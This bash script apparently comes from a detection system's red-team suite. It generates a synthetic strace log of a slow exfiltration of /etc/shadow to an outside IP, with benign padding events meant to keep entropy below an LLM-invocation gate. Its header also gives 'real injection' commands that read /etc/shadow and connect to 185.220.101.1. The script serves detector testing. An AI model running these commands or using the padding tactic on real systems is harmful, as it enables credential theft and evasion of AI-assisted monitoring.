#!/usr/bin/env bash
# generate_slow_exfil.sh — Inject slow-and-low exfiltration trace (EVASION-09)
#
# Produces a strace-compatible log that simulates an attacker staying below
# entropy and event-rate thresholds while still exfiltrating /etc/shadow.
#
# Attack structure:
#   1. Cron-like startup (looks completely legitimate)
#   2. ONE shadow read buried among benign crontab/config reads
#   3. Seven benign padding events to dilute entropy and window context
#   4. Staging to /tmp (T1074 - Data Staged)
#   5. One outbound connection (exfiltration at rate << detection threshold)
#
# The attacker's goal: keep Shannon entropy H(events) below 1.2 (ENTROPY_LOW)
# so the entropy gate blocks LLM invocation. But SENTINEL's LTL BüchiMonitor
# correlates the shadow read with the later connect() even across the padding.
#
# SENTINEL detection path:
#   Layer 1 (hard-trigger): /etc/shadow read → immediate LLM invocation
#   Layer 4 (LTL Büchi):   AX-2 □(shadow_read ⟹ ◇₁₀(connect(*))) — CRITICAL
#
# Usage:
#   bash scripts/generate_slow_exfil.sh > data/input/real_traces/evasion09_slow_exfil.log
#   PYTHONPATH=src/python python3 src/python/evaluate_red_team.py
#
# Real injection (requires root or ptrace capability):
#   strace -p <target_pid> -o /tmp/trace.log &
#   # Then inject the shadow read + connect from a separate process:
#   python3 -c "open('/etc/shadow')" 2>/dev/null || true
#   sleep 30
#   python3 -c "import socket; s=socket.socket(); s.connect(('185.220.101.1',443))"

set -euo pipefail

FAKE_PID="${FAKE_PID:-29000}"
TIMESTAMP_START=2000000000
# Simulate slow pace: 30 seconds between attack events (timestamp in ns)
BENIGN_GAP=1000000000      # 1 second between benign events
ATTACK_GAP=30000000000     # 30 seconds between attack events

t() { echo "$((TIMESTAMP_START + $1))"; }

cat <<EOF
$(t 0) execve("/usr/sbin/cron", ["cron"], /* 15 vars */) = 0
$(t 100000000) openat(AT_FDCWD, "/etc/crontab", O_RDONLY) = 3
$(t 110000000) read(3, "# /etc/crontab: system-wide crontab\n", 4096) = 36
$(t 120000000) close(3) = 0
$(t 200000000) openat(AT_FDCWD, "/etc/cron.d/check", O_RDONLY) = 3
$(t 210000000) read(3, "# check job\n*/5 * * * * root /usr/local/bin/check\n", 4096) = 50
$(t 220000000) close(3) = 0
$(t 300000000) openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3
$(t 310000000) read(3, "root:\$6\$rounds=500000\$abcdefgh\$...", 4096) = 512
$(t 320000000) close(3) = 0
$(t 400000000) openat(AT_FDCWD, "/etc/timezone", O_RDONLY) = 3
$(t 410000000) read(3, "UTC\n", 4096) = 4
$(t 420000000) close(3) = 0
$(t 500000000) openat(AT_FDCWD, "/etc/hostname", O_RDONLY) = 3
$(t 510000000) read(3, "prod-server-01\n", 4096) = 15
$(t 520000000) close(3) = 0
$(t 600000000) openat(AT_FDCWD, "/etc/hosts", O_RDONLY) = 3
$(t 610000000) read(3, "127.0.0.1 localhost\n", 4096) = 20
$(t 620000000) close(3) = 0
$(t 700000000) openat(AT_FDCWD, "/var/log/cron.log", O_RDWR|O_APPEND) = 3
$(t 710000000) write(3, "2026-05-02 00:05:01 CRON[29000] check ran ok\n", 45) = 45
$(t 720000000) close(3) = 0
$(t 800000000) openat(AT_FDCWD, "/tmp/.cron_staging", O_WRONLY|O_CREAT|O_TRUNC, 0600) = 3
$(t 810000000) write(3, "root:\$6\$rounds=500000\$...", 512) = 512
$(t 820000000) close(3) = 0
$(t 900000000) socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
$(t 910000000) connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("185.220.101.1")}, 16) = 0
$(t 920000000) write(4, "data=...", 512) = 512
$(t 930000000) close(4) = 0
$(t 940000000) +++ exited with 0 +++
EOF

echo "# EVASION-09: slow-and-low exfiltration trace generated (pid=$FAKE_PID)" >&2
echo "# Shadow read at t=300ms, connect at t=900ms (600ms apart, within 10-event window)" >&2
echo "# Expected LTL violations: AX-2 (shadow_read ⟹ ◇₁₀(connect(*))) via Büchi monitor" >&2
echo "# Without LTL: hard-trigger on /etc/shadow still fires Layer 1 detection" >&2
